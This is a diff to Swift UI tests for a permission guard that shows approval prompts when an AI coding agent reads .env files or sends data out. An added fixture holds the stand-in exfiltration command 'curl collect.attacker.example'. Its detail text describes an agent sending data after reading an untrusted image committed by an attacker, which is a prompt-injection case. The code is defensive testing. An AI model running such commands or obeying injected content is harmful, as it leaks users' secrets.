@@ -4,22 +4,46 @@ import SwiftUI
 
 final class GuardReviewTests: XCTestCase {
     let pending = GuardPending(id: "request", agent: "claude", tool: "Read", path: "/workspace/app/.env", ruleID: "env-files", ts: "", scopeText: nil, advisor: nil, availableScopes: [.init(kind: "once", expiry: nil), .init(kind: "exact", expiry: "24h")], readerExe: "/bin/claude", workspace: "/workspace/app", sessionID: "session")
+    let sendAfterImage = GuardPending(id: "send", agent: "claude", tool: "Bash", path: "curl collect.attacker.example", ruleID: "untrusted-egress", ts: "", scopeText: nil, advisor: nil, availableScopes: [.init(kind: "once", expiry: nil), .init(kind: "session", expiry: nil)], readerExe: "/bin/claude", workspace: "/workspace/app", sessionID: "session", detail: "This session read untrusted content: image /workspace/app/docs/build-spec.png, committed by Mallory <mallory@attacker.example> in app@c405510 on 2026-10-28 (docs: add build spec diagram). It now sends data out: curl collect.attacker.example.")
 
     func testFutureConfirmationBindsRecordedIdentityAndSelectedLifetime() throws {
         let text = try XCTUnwrap(pending.confirmation(scope: "exact", expiry: "24h"))
         for fact in ["Read", "/workspace/app/.env", "/workspace/app", "/bin/claude", "24 hours", "signatures are not verified"] { XCTAssertTrue(text.contains(fact), fact) }
         XCTAssertNil(pending.confirmation(scope: "exact", expiry: "7d"))
+        XCTAssertFalse(pending.requestFacts.contains("Why:"))
+    }
+
+    @MainActor
+    func testSendAfterUntrustedInputNamesWhatTheSessionRead() throws {
+        XCTAssertTrue(sendAfterImage.requestFacts.hasPrefix("Why: This session read untrusted content: image /workspace/app/docs/build-spec.png, committed by Mallory <mallory@attacker.example>"))
+        XCTAssertTrue(sendAfterImage.requestFacts.contains("Resource: curl collect.attacker.example"))
+        XCTAssertEqual(AppState.guardPromptHeadline(sendAfterImage), "Claude wants to send data out after reading untrusted content")
+        XCTAssertEqual(AppState.guardPromptHeadline(pending), "Claude requests Read access")
+        let text = try XCTUnwrap(sendAfterImage.confirmation(scope: "session", expiry: nil))
+        XCTAssertTrue(text.hasPrefix("Allow these sends from this tool until this session ends."), text)
+        XCTAssertTrue(text.contains("Other sends still ask."))
+        XCTAssertFalse(text.contains("File approval"))
     }
 
     @MainActor
     func testRequestRendersAtPopoverWidth() async throws {
+        try await renderRequest(pending, to: "access-request.png")
+    }
+
+    @MainActor
+    func testSendAfterUntrustedInputRendersAtPopoverWidth() async throws {
+        try await renderRequest(sendAfterImage, to: "untrusted-egress-request.png")
+    }
+
+    @MainActor
+    private func renderRequest(_ request: GuardPending, to name: String) async throws {
         _ = NSApplication.shared
         let policy = NSApp.activationPolicy()
         XCTAssertTrue(NSApp.setActivationPolicy(.regular))
         NSApp.finishLaunching()
         defer { NSApp.setActivationPolicy(policy) }
         let state = AppState.previewAttention()
-        state.seedPostureForTesting(nil, pendingGuard: pending)
+        state.seedPostureForTesting(nil, pendingGuard: request)
         let controller = NSHostingController(rootView: ConsoleView(state: state, scrollable: false))
         let window = NSWindow(contentViewController: controller)
         window.isReleasedWhenClosed = false
@@ -33,7 +57,7 @@ final class GuardReviewTests: XCTestCase {
         controller.view.cacheDisplay(in: controller.view.bounds, to: bitmap)
         let dir = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent().appendingPathComponent(".build/guard-qa")
         try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
-        try XCTUnwrap(bitmap.representation(using: .png, properties: [:])).write(to: dir.appendingPathComponent("access-request.png"))
+        try XCTUnwrap(bitmap.representation(using: .png, properties: [:])).write(to: dir.appendingPathComponent(name))
         window.orderOut(nil); window.close()
     }
 
